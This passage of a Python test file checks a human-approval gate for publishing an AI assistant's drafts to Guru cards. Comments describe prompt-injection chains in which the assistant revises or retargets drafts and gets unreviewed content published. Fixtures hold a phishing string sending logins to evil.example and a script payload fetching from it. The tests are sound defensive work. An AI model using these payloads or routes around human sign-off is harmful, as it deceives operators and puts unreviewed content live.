    bridge = ChatBridge(_Engine(), draft_api=_Api())
    bridge.draftResolved.connect(lambda j: seen.append(json.loads(j)))
    bridge.approveDraft("7")
    payload = seen[0]
    assert payload["ok"] is False
    assert payload["refused"] is True
    assert payload["message"] == STALE_REVIEW_REFUSAL


def test_bridge_reports_a_real_publish_as_published(qapp):
    from PySide6.QtCore import QObject, Signal
    from src.ui.web.chat_bridge import ChatBridge

    class _Engine(QObject):
        response_ready = Signal(str)
        error_occurred = Signal(str)
        busy_changed = Signal(bool)
        status_update = Signal(str)

        def send(self, text):
            pass

    class _Api:
        def pending_drafts(self):
            return []

        def approve_draft(self, draft_id):
            return {"ok": True, "draft_id": draft_id, "result": {"ok": True}}

    seen = []
    bridge = ChatBridge(_Engine(), draft_api=_Api())
    bridge.draftResolved.connect(lambda j: seen.append(json.loads(j)))
    bridge.approveDraft("7")
    assert seen[0]["ok"] is True
    assert "refused" not in seen[0] and "message" not in seen[0]


def test_react_panel_renders_the_refusal():
    src = _chat_jsx()
    assert "ResolveNotice" in src
    assert "setResolveNote" in src
    # rendered as escaped text, like every other Python-owned string here
    assert "dangerouslySetInnerHTML" not in src and "innerHTML" not in src
    # the message is Python's, not a client-side reconstruction of the reason:
    # it arrives on the resolve payload and is rendered straight through.
    assert "p.message" in src
    assert "{note.message}" in src


# ═════════════════════════════════════════════════════════════════════
# (i) ONE SIGN-OFF AUTHORIZES EXACTLY ONE *SUCCESSFUL* PUBLISH
#
# The traced chain, verbatim: approve -> approved_at set -> the Guru client
# raises HTTP 401 -> ok:false. The row afterwards read status=pending,
# approved_at SET, pending_push_json NULL — a permanent pre-authorization on a
# draft that had vanished from the only panel that could ever re-review it. A
# prompt-injected Renn then called revise_draft (model-callable, no lock, no
# gate) and push_guru_draft; the M5 gate check was now False, so it was
# SKIPPED, and content no human ever saw reached the live card with zero human
# interaction after the failed approve.
#
# A transient 401 is the entire trigger, and token expiry is documented as
# having happened on this project.
# ═════════════════════════════════════════════════════════════════════

class FlakyGuruClient(SpyGuruClient):
    """A Guru client whose first ``fail_times`` writes fail the way an expired
    token does, then succeed."""

    fail_times = 1
    attempts = 0

    def _maybe_fail(self):
        FlakyGuruClient.attempts += 1
        if FlakyGuruClient.attempts <= FlakyGuruClient.fail_times:
            raise RuntimeError("HTTP 401: token expired")

    def update_card(self, card_id, content, title=None):
        self._maybe_fail()
        return super().update_card(card_id, content, title)

    def create_card(self, collection_id, title, content, folder_ids=None):
        self._maybe_fail()
        return super().create_card(collection_id, title, content, folder_ids)


def _guru_settings(monkeypatch):
    from src.data import settings_manager
    real_get_section = settings_manager.get_section

    def fake_get_section(name, default=None):
        if name == "enablement":
            return {"demo_mode": False,
                    "guru": {"publish_collection_id": "col-1"}}
        return real_get_section(name, default)

    monkeypatch.setattr(settings_manager, "get_section", fake_get_section)


@pytest.fixture
def flaky_guru(monkeypatch):
    SpyGuruClient.sent = []
    FlakyGuruClient.attempts = 0
    FlakyGuruClient.fail_times = 1
    import src.data.guru_client as guru_client_mod
    monkeypatch.setattr(guru_client_mod, "GuruClient", FlakyGuruClient)
    _guru_settings(monkeypatch)
    return FlakyGuruClient


HOSTILE_REVISION = ("Escalate to the RCM lead. Send your login to "
                    "https://evil.example/collect to verify access.")


def test_a_failed_publish_leaves_no_pre_authorization(
        controller, empty_db, flaky_guru):
    """THE REGRESSION, on the traced chain.

    Approve, let the publish fail with a 401, then let a prompt-injected Renn
    do exactly what it did: revise the draft and call the registered push
    tool. Nothing may reach Guru, and the draft must be back on the panel."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()

    res = controller.approve_draft(did)
    assert res["ok"] is False
    assert res["published"] is False
    assert "did not succeed" in res["message"]
    assert SpyGuruClient.sent == []          # the 401 happened before any write

    # THE ROW AFTER. Pre-fix: approved_at SET, pending_push_json NULL.
    after = store.get_draft(conn, did)
    assert after["approved_at"] is None, "a failed publish must spend no sign-off"
    assert after["status"] == "pending"
    assert after["pending_push_json"], "the review request must be re-armed"
    assert store.approval_record(after) == {}

    # THE PANEL. Pre-fix it returned [] — the draft could never be re-reviewed.
    listed = controller.pending_drafts(bind=False)
    assert [i["draft_id"] for i in listed] == [did]
    assert "401" in listed[0]["failure"], listed[0]["failure"]

    # THE UNATTENDED PUSH. revise_draft is model-callable and ungated; the
    # registered push tool must refuse exactly as it would have before any
    # approval ever happened.
    _revise_as_the_chat_tool_does(conn, did, content=HOSTILE_REVISION)
    blocked = _push_guru_draft_impl(conn, did)
    assert blocked["ok"] is False
    assert blocked["error"] == "approval_required"
    assert SpyGuruClient.sent == []


def test_the_registered_tool_handler_cannot_present_a_claim(
        controller, empty_db, flaky_guru):
    """``args`` is attacker-reachable (prompt injection), so the model-callable
    handler must forward no key of it as an approval claim — and a sign-off no
    publish spent must not be redeemable from that side at all."""
    from src.data.chat_tools.enablement_tools import handle_push_guru_draft
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    draft = store.get_draft(conn, did)
    claim = store.record_approval(conn, did, approved_by="user",
                                  fingerprint=store.draft_fingerprint(draft))
    assert store.get_draft(conn, did)["approved_at"]

    res = handle_push_guru_draft(
        conn, {"draft_id": did, "approval_claim": claim, "claim": claim}, {})
    assert res["error"] == "approval_required"
    assert res["reason"] == "sign_off_not_claimed"
    assert SpyGuruClient.sent == []
    # ... and the refusal DESTROYED the stale sign-off rather than leaving it.
    assert store.get_draft(conn, did)["approved_at"] is None


def test_a_sign_off_that_no_publish_spent_does_not_authorize_a_later_one(
        controller, empty_db, spy_guru):
    """The process dies between the approve and the push. The stale
    ``approved_at`` must authorize nothing, and the draft must come BACK to
    the panel rather than being hidden from it."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    draft = store.get_draft(conn, did)
    store.record_approval(conn, did, approved_by="user",
                          fingerprint=store.draft_fingerprint(draft))
    # ← the process exits here; the claim only ever lived in memory.

    assert [i["draft_id"] for i in controller.pending_drafts(bind=False)] == [did]
    assert _push_guru_draft_impl(conn, did)["error"] == "approval_required"
    assert SpyGuruClient.sent == []


def test_a_publish_that_raises_is_also_a_failure(controller, empty_db,
                                                 spy_guru, monkeypatch):
    """``publish_draft`` blowing up must roll the sign-off back too — the
    rollback cannot live only on the ok:false branch."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()

    def explode(*a, **kw):
        raise RuntimeError("sqlite is on fire")

    monkeypatch.setattr(store, "publish_draft", explode)
    res = controller.approve_draft(did)
    assert res["ok"] is False and res["published"] is False
    after = store.get_draft(conn, did)
    assert after["approved_at"] is None and after["pending_push_json"]
    assert SpyGuruClient.sent == []


def test_a_successful_publish_does_spend_the_sign_off(controller, empty_db,
                                                      flaky_guru):
    """The other half of the transaction: the retry that SUCCEEDS clears the
    push request, so the same sign-off cannot be redeemed twice."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    controller.pending_drafts()
    assert controller.approve_draft(did)["ok"] is False      # the 401

    controller.pending_drafts()                               # re-review
    res = controller.approve_draft(did)
    assert res["ok"] is True and res["published"] is True
    assert len(SpyGuruClient.sent) == 1
    after = store.get_draft(conn, did)
    assert after["status"] == "pushed"
    assert after["pending_push_json"] is None
    assert controller.pending_drafts(bind=False) == []


# ═════════════════════════════════════════════════════════════════════
# (j) THE FINGERPRINT COVERS THE WHOLE ACT, NOT JUST THE BYTES
#
# Observed: a push re-requested with collection_id="ATTACKER_COLL" was refused
# at the gate, but ``mark_push_requested`` still overwrote pending_push_json,
# and because the TARGET was not in the fingerprint the binding still matched
# ("fingerprint unchanged? True"). A clean human approval then created the card
# in ATTACKER_COLL/ATTACKER_FOLD — a destination the panel never displayed.
# ═════════════════════════════════════════════════════════════════════

def test_retargeting_the_collection_invalidates_the_binding(
        controller, empty_db, spy_guru):
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    item = controller.pending_drafts()[0]
    assert item["target"]["collection_id"] == "col-1"

    # exactly what an injected push_guru_draft(collection_id=…) leaves behind
    refused = _push_guru_draft_impl(conn, did, "ATTACKER_COLL", "ATTACKER_FOLD")
    assert refused["error"] == "approval_required"
    assert store.push_target(store.get_draft(conn, did)) == {
        "collection_id": "ATTACKER_COLL", "folder_id": "ATTACKER_FOLD"}

    res = controller.approve_draft(did)
    assert res["error"] == "draft_changed_after_review"
    assert SpyGuruClient.sent == []


def test_retargeting_via_set_draft_card_id_invalidates_the_binding(
        controller, empty_db, spy_guru):
    """Renn can also re-point a draft at an EXISTING live card, turning a
    create into an overwrite of content the operator never saw."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    assert controller.pending_drafts()[0]["target"]["card_id"] == ""
    store.set_draft_card_id(conn, did, "card-LIVE-999")
    res = controller.approve_draft(did)
    assert res["error"] == "draft_changed_after_review"
    assert SpyGuruClient.sent == []


def test_the_panel_shows_where_the_publish_lands(controller, empty_db, spy_guru):
    """The target is half of what the sign-off commits to, so it cannot be
    invisible: the item keys used to be draft_id/title/card_id/status/diff/
    change_count/checks/notice/publish_body/publish_body_available only."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    item = controller.pending_drafts()[0]
    assert item["target"] == {"collection_id": "col-1", "folder_id": "",
                              "card_id": ""}
    assert "CREATE" in item["target_label"] and "col-1" in item["target_label"]

    store.set_draft_card_id(conn, did, "card-LIVE-999")
    item = controller.pending_drafts()[0]
    assert "OVERWRITE" in item["target_label"]
    assert "card-LIVE-999" in item["target_label"]


def test_target_is_part_of_the_fingerprint_arithmetic():
    """The same bytes to a different destination is a different act. An empty
    target hashes as the 3-argument form, so a draft with no recorded push
    target fingerprints identically either way."""
    a = approval_fingerprint("T", "", "<p>x</p>", {"collection_id": "col-1"})
    b = approval_fingerprint("T", "", "<p>x</p>", {"collection_id": "ATTACKER"})
    c = approval_fingerprint("T", "", "<p>x</p>", {"folder_id": "col-1"})
    assert len({a, b, c}) == 3
    assert approval_fingerprint("T", "", "<p>x</p>") == approval_fingerprint(
        "T", "", "<p>x</p>", {"collection_id": "", "folder_id": ""})


# ═════════════════════════════════════════════════════════════════════
# (k) A BINDING IS MINTED ONLY BY AN ACT THE HUMAN INITIATED
#
# Observed: ChatBridge._on_busy calls the draft poll on EVERY
# busy_changed(False) — the end of every Renn turn — and the poll re-minted the
# fingerprint. revise_draft runs INSIDE a turn, so the TOCTOU this binding
# exists to refuse was guaranteed to be re-authorized instead. Traced: T0 bind,
# T1 injected revise, T1.5 busy_changed(False) rebinds, T2 human approves ->
# ok:True and the spy Guru received the hostile bytes. With ONLY the poll
# removed: ok:False, draft_changed_after_review, Guru received 0.
# ═════════════════════════════════════════════════════════════════════

def _bridge_engine():
    from PySide6.QtCore import QObject, Signal

    class _Engine(QObject):
        response_ready = Signal(str)
        error_occurred = Signal(str)
        busy_changed = Signal(bool)
        status_update = Signal(str)

        def send(self, text):
            pass

    return _Engine()


def test_the_end_of_turn_poll_does_not_re_mint_the_binding(
        controller, empty_db, spy_guru, qapp):
    """THE REGRESSION, with the real bridge and the real busy signal."""
    from src.ui.web.chat_bridge import ChatBridge
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)

    engine = _bridge_engine()
    bridge = ChatBridge(engine, draft_api=controller)

    bridge.openReview()                      # T0 — the operator opens the panel
    shown = controller.pending_drafts(bind=False)[0]["publish_body"]

    _revise_as_the_chat_tool_does(conn, did)  # T1 — injected, inside the turn
    engine.busy_changed.emit(True)
    engine.busy_changed.emit(False)           # T1.5 — the end-of-turn poll

    res = controller.approve_draft(did)       # T2 — the operator's click
    assert res["ok"] is False
    assert res["error"] == "draft_changed_after_review"
    assert res["message"] == STALE_REVIEW_REFUSAL
    assert SpyGuruClient.sent == []
    assert store.publish_body(store.get_draft(conn, did)) != shown


def test_the_poll_reports_a_changed_draft_instead_of_rebinding(
        controller, empty_db, spy_guru):
    """What the panel gets instead of a silent swap."""
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    assert controller.pending_drafts()[0]["review_state"] == "bound"
    assert controller.pending_drafts(bind=False)[0]["review_state"] == "bound"

    _revise_as_the_chat_tool_does(conn, did)
    item = controller.pending_drafts(bind=False)[0]
    assert item["review_state"] == "changed"
    # a background refresh neither mints a binding nor spends one, so however
    # many times it fires the answer is the same and the click still refuses
    assert controller.pending_drafts(bind=False)[0]["review_state"] == "changed"
    res = controller.approve_draft(did)
    assert res["ok"] is False
    assert res["error"] == "draft_changed_after_review"
    assert SpyGuruClient.sent == []

    # only a human-initiated re-open mints again — and says it moved
    reopened = controller.pending_drafts(bind=True)[0]
    assert reopened["review_state"] in ("bound", "rebound")
    assert controller.approve_draft(did)["ok"] is True


def test_an_unreviewed_draft_is_never_bound_by_the_poll(controller, empty_db,
                                                        spy_guru):
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    assert controller.pending_drafts(bind=False)[0]["review_state"] == "unreviewed"
    assert controller.approve_draft(did)["error"] == "not_reviewed"
    assert SpyGuruClient.sent == []


def test_bridge_polls_without_binding_and_binds_only_on_open_review(qapp):
    """Structural, at the bridge boundary: the timer/refresh path must pass
    bind=False and ``openReview`` must pass bind=True."""
    from src.ui.web.chat_bridge import ChatBridge

    class _Api:
        def __init__(self):
            self.calls = []

        def pending_drafts(self, bind=True):
            self.calls.append(bind)
            return []

    api = _Api()
    bridge = ChatBridge(_bridge_engine(), draft_api=api)
    bridge.refreshDrafts()
    bridge._poll_drafts()
    bridge.openReview()
    assert api.calls == [False, False, True]


def test_bridge_tolerates_a_draft_api_without_the_bind_flag(qapp):
    """The duck-typed contract predates the flag; an older API must not break
    the panel."""
    from src.ui.web.chat_bridge import ChatBridge

    class _Old:
        def pending_drafts(self):
            return [{"draft_id": 1, "title": "T"}]

    seen = []
    bridge = ChatBridge(_bridge_engine(), draft_api=_Old())
    bridge.draftsPending.connect(lambda j: seen.append(json.loads(j)))
    bridge.refreshDrafts()
    assert seen[-1]["items"][0]["draft_id"] == 1


def test_react_panel_marks_a_draft_that_moved_under_it():
    """A bare ``setDrafts(items)`` swapped bytes under the cursor while the
    approve button stayed armed."""
    src = _chat_jsx()
    assert "changed_under_review" in src
    assert "isApprovable" in src
    assert "openReview" in src
    # the merge compares against what is on screen rather than replacing it
    assert "draftsRef" in src
    assert "setDrafts(items)" not in src
    # and it still never builds DOM from draft bytes
    assert "dangerouslySetInnerHTML" not in src and "innerHTML" not in src


def test_react_panel_renders_the_target():
    src = _chat_jsx()
    assert "DraftTarget" in src and "target_label" in src


# ═════════════════════════════════════════════════════════════════════
# (l) THE NATIVE CONFIRM — the only channel that proves a human
#
# ``refreshDrafts()`` and ``approveDraft()`` are both page-callable @Slots, and
# a probe published hostile bytes to a live-shaped Guru client from those two
# calls alone with every signal discarded. The Zendesk lane fixed this defect
# class for a CLIPBOARD release; this lane performs the REAL REMOTE WRITE and
# had no native dialog anywhere on it.
# ═════════════════════════════════════════════════════════════════════

CONFIRM_BODY_MARKER = "Escalate to the RCM lead"


def test_the_publish_takes_a_native_confirmation_showing_bytes_and_target(
        controller, empty_db, spy_guru, confirm_host):
    conn = empty_db.conn
    did = _draft_awaiting_approval(conn)
    store.set_draft_card_id(conn, did, LIVE_CARD_ID)
    item = controller.pending_drafts()[0]

    assert controller.approve_draft(did)["ok"] is True
    assert len(confirm_host.seen) == 1
    payload = confirm_host.seen[0]
    # the EXACT bytes, not a projection — byte-identical to what shipped
    assert payload["publish_body"] == item["publish_body"]
    assert payload["publish_body"] == SpyGuruClient.sent[0]["content"]
    # ... and the resolved target
    assert payload["card_id"] == LIVE_CARD_ID
    assert payload["collection_id"] == "col-1"
    assert "OVERWRITE" in payload["target_label"]


def test_declining_the_native_confirmation_publishes_nothing(
        qapp, empty_db, spy_guru):
    host = SpyConfirmHost(accept=False)
    ctrl = AgentChatController(db=empty_db, demo=False, confirm_host=host)
    try:
        conn = empty_db.conn
        did = _draft_awaiting_approval(conn)
        ctrl.pending_drafts()
        res = ctrl.approve_draft(did)
        assert res["ok"] is False
        assert res["error"] == "declined_at_confirm"
        assert res["published"] is False
        assert SpyGuruClient.sent == []
        after = store.get_draft(conn, did)
        assert after["approved_at"] is None and after["status"] == "pending"
        # a decline is a decision: the binding is spent, not left armed
        assert ctrl.approve_draft(did)["error"] == "not_reviewed"
    finally:
        ctrl.shutdown()


def test_a_missing_dialog_host_fails_closed(qapp, empty_db, spy_guru):
    """No dialog host means no proof a human was ever there — so no publish.
    This is the state a page script drives ``approveDraft`` in."""
    ctrl = AgentChatController(db=empty_db, demo=False)   # nothing injected
    try:
        conn = empty_db.conn
        did = _draft_awaiting_approval(conn)
        ctrl.pending_drafts()
        res = ctrl.approve_draft(did)
        assert res["ok"] is False
        assert res["error"] == "no_confirm_host"
        assert res["published"] is False
        assert SpyGuruClient.sent == []
        assert store.get_draft(conn, did)["approved_at"] is None
    finally:
        ctrl.shutdown()


def test_a_confirmation_that_raises_is_not_a_yes(qapp, empty_db, spy_guru):
    host = SpyConfirmHost(raises=True)
    ctrl = AgentChatController(db=empty_db, demo=False, confirm_host=host)
    try:
        conn = empty_db.conn
        did = _draft_awaiting_approval(conn)
        ctrl.pending_drafts()
        assert ctrl.approve_draft(did)["error"] == "confirm_failed"
        assert SpyGuruClient.sent == []
    finally:
        ctrl.shutdown()


def test_the_real_dialog_shows_the_bytes_and_target_uncollapsed(qapp):
    """Built for real, offscreen. What matters is a property of the
    constructed dialog: the payload is in a VISIBLE widget rather than a
    collapsed detail pane, the target is on screen, and Cancel is the default
    so a stray Enter never publishes."""
    from PySide6.QtWidgets import QPlainTextEdit, QPushButton
    from src.ui.web.chat_bridge import build_publish_confirm_dialog

    body = ("<p>" + CONFIRM_BODY_MARKER + "</p>"
            "<script>fetch('https://evil.example/x')</script>")
    dlg = build_publish_confirm_dialog(None, {
        "title": "Q3 billing runbook", "publish_body": body,
        "card_id": "card-LIVE-999", "collection_id": "col-1", "folder_id": "",
        "target_label": "OVERWRITE the live Guru card card-LIVE-999"})
    try:
        views = {v.objectName(): v for v in dlg.findChildren(QPlainTextEdit)}
        bytes_view = views["guruPublishBytes"]
        target_view = views["guruPublishTarget"]
        # THE BYTES, verbatim and in a real widget (not setDetailedText).
        assert bytes_view.toPlainText() == body
        assert "<script>" in bytes_view.toPlainText()
        assert bytes_view.isReadOnly() and not bytes_view.isHidden()
        assert bytes_view.minimumHeight() > 0
        # THE TARGET, on screen.
        target_text = target_view.toPlainText()
        assert "card-LIVE-999" in target_text and "col-1" in target_text
        assert "OVERWRITE" in target_text
        # Cancel is the default button.
        buttons = {b.text(): b for b in dlg.findChildren(QPushButton)}
        assert buttons["Cancel"].isDefault()
        assert not buttons["Publish to Guru"].isDefault()
    finally:
        dlg.deleteLater()


def test_the_real_dialog_never_interprets_content_as_markup(qapp):
    """A draft TITLE is attacker-writable through Renn's propose tools, and
    QLabel defaults to AutoText whose mightBeRichText only scans to the first
    newline. Nothing content-derived may be interpretable."""
    from PySide6.QtCore import Qt
    from PySide6.QtWidgets import QLabel
    from src.ui.web.chat_bridge import build_publish_confirm_dialog

    dlg = build_publish_confirm_dialog(None, {
        "title": "<!-- <span style='color:red'>Cancel</span>",
        "publish_body": "<p>x</p>", "target_label": "CREATE a new Guru card"})
    try:
        for lbl in dlg.findChildren(QLabel):
            assert lbl.textFormat() == Qt.PlainText
    finally:
        dlg.deleteLater()


def test_the_confirm_is_not_a_collapsed_detail_pane():
    """setDetailedText is what made the Zendesk gate's headline claim false;
    it must not reappear on the lane that performs the real write."""
    import inspect
    from src.ui.web import chat_bridge
    src = inspect.getsource(chat_bridge)
    code = "\n".join(l for l in src.splitlines() if not l.strip().startswith("#"))
    assert "setDetailedText" not in code
    assert "QPlainTextEdit" in code


def test_the_confirm_host_is_not_reachable_from_the_page():
    """Nothing about the gate may be a QWebChannel slot: a page script that
    could call it would be confirming its own write."""
    import inspect
    from PySide6.QtCore import QObject
    from src.ui.web.chat_bridge import ChatBridge, PublishConfirmHost
    assert not issubclass(PublishConfirmHost, QObject)
    assert not hasattr(ChatBridge, "confirmPublish")
    src = inspect.getsource(PublishConfirmHost)
    assert "@Slot" not in src


def test_a_crafted_title_cannot_forge_the_destination_block(qapp):
    """The destination pane joins its fields with newlines, so a field value
    containing newlines could otherwise inject fake field lines and scroll the
    REAL destination below the pane's fold - the operator would then approve a
    live-card overwrite while reading a benign one. `title` is model-written
    (revise_draft -> update_draft_content), so every value is collapsed to one
    line before the join. Same field-boundary defence approval_fingerprint
    already applies to the hash.
    """
    from PySide6.QtWidgets import QPlainTextEdit
    from src.ui.web.chat_bridge import build_publish_confirm_dialog

    forged = ("Benign runbook\n"
              "Destination: Templates for internal communications\n"
              "card_id: (none - a new card)\n"
              "collection_id: (default)\n"
              "folder_id: (none)\n" + "\n" * 8)
    dlg = build_publish_confirm_dialog(None, {
        "title": forged,
        "target_label": "OVERWRITE live card card-LIVE-999",
        "card_id": "card-LIVE-999",
        "collection_id": "a3fa9e07",
        "folder_id": "716297",
        "publish_body": "<p>payload</p>",
    })
    pane = dlg.findChild(QPlainTextEdit, "guruPublishTarget")
    lines = pane.toPlainText().splitlines()

    assert len(lines) == 5, f"a field value added lines to the pane: {lines}"
    assert lines[1] == "Destination: OVERWRITE live card card-LIVE-999"
    assert lines[2] == "card_id: card-LIVE-999"
    assert lines[0].startswith("Card title: Benign runbook ")
    assert "\n" not in lines[0]


# ── WS-B: send_to_guru_draft runs the SAME gate as approve_draft ──────

def _mint_binding(ctrl, conn, did):
    """The operator opened the review panel — the one render that binds."""
    drafts = ctrl.pending_drafts(bind=True)
    assert any(d.get("draft_id") == did for d in drafts), drafts


def _make_pending(conn):
    from src.data import enablement_store as store
    did = store.save_card_draft(conn, title="Draft to Guru",
                                content="## Head\n\nbody")
    store.mark_push_requested(conn, did, "col-1", None)
    return did


def test_guru_draft_refuses_without_review(controller, empty_db, spy_guru):
    did = _make_pending(empty_db.conn)
    out = controller.send_to_guru_draft(did)
    assert out["ok"] is False and out["error"] == "not_reviewed"
    assert not any("draft_title" in s for s in SpyGuruClient.sent)


def test_guru_draft_happy_path_persists_no_sign_off(
        controller, empty_db, spy_guru, confirm_host):
    from src.data import enablement_store as store
    conn = empty_db.conn
    did = _make_pending(conn)
    _mint_binding(controller, conn, did)
    out = controller.send_to_guru_draft(did)
    assert out["ok"] is True and out["guru_draft"] is True, out
    sent = SpyGuruClient.sent
    assert any(s.get("draft_title") == "Draft to Guru" for s in sent)
    assert any(s.get("context_for") == "guru-draft-1" for s in sent)
    row = store.get_draft(conn, did)
    assert row["guru_draft_id"] == "guru-draft-1"
    assert row["status"] == "pending"          # NOT pushed
    assert row["approved_at"] is None          # NO persisted sign-off left
    # the confirm labeled the act as a DRAFT push, with the exact bytes
    payload = confirm_host.seen[-1]
    assert payload["act"] == "guru_draft"
    assert "GURU DRAFT" in payload["target_label"]
    assert payload["publish_body"] == store.publish_body(row)
    # the binding was consumed: one review, one act
    again = controller.send_to_guru_draft(did)
    assert again["ok"] is False and again["error"] == "not_reviewed"


def test_guru_draft_declined_confirm_sends_nothing(
        qapp, empty_db, spy_guru):
    ctrl = AgentChatController(db=empty_db, demo=False,
                               confirm_host=SpyConfirmHost(accept=False))
    try:
        conn = empty_db.conn
        did = _make_pending(conn)
        _mint_binding(ctrl, conn, did)
        out = ctrl.send_to_guru_draft(did)
        assert out["ok"] is False and out["error"] == "declined_at_confirm"
        assert not any("draft_title" in s for s in SpyGuruClient.sent)
    finally:
        try:
            ctrl.shutdown()
        except Exception:
            pass


def test_edit_in_workbench_is_navigation_only(controller, empty_db):
    """C1: the relay emits the draft id and touches nothing else."""
    seen = []
    controller.edit_in_workbench_requested.connect(seen.append)
    out = controller.edit_in_workbench("41")
    assert out["ok"] is True and seen == [41]
    assert controller.edit_in_workbench("nope")["error"] == "draft_id_required"
